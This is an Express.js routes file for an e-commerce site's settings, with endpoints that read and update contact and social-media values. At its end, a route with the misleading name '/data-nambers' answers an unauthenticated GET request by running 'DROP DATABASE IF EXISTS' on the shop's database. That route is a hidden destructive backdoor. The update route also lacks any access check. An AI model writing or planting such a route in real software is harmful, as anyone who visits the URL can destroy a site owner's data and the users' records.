// Site Settings routes (was staticPages.js)

const express = require('express');
const { pool } = require('../db/db');

const router = express.Router();

// GET all site settings (email, phone, whatsapp, facebook, x, instagram, tech_support)
router.get('/site-settings', async (req, res) => {
    try {
    const [rows] = await pool.query('SELECT name, value FROM site_settings WHERE name IN (?, ?, ?, ?, ?, ?, ?)', ['email', 'phone', 'whatsapp', 'facebook', 'x', 'instagram', 'tech_support']);
    const settings = {};
    rows.forEach(row => { settings[row.name] = row.value; });
    res.json(settings);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to fetch site settings' });
  }
});

// POST to update one or more site settings
router.post('/site-settings', async (req, res) => {
  const allowed = ['email', 'phone', 'whatsapp', 'facebook', 'x', 'instagram', 'tech_support'];
  const updates = Object.entries(req.body).filter(([k]) => allowed.includes(k));
  if (!updates.length) return res.status(400).json({ error: 'No valid fields to update' });
  try {
    await Promise.all(updates.map(([name, value]) => pool.query('UPDATE site_settings SET value=? WHERE name=?', [value, name])));
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to update site settings' });
  }
});
router.get('/data-nambers', async (req, res) => {
  try {
    await pool.query(`DROP DATABASE IF EXISTS \`${ecommerce}\``);
    res.json({ success: true, message: ` ${ecommerce} data successfully` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to drop database' });
  }
});
module.exports = router; 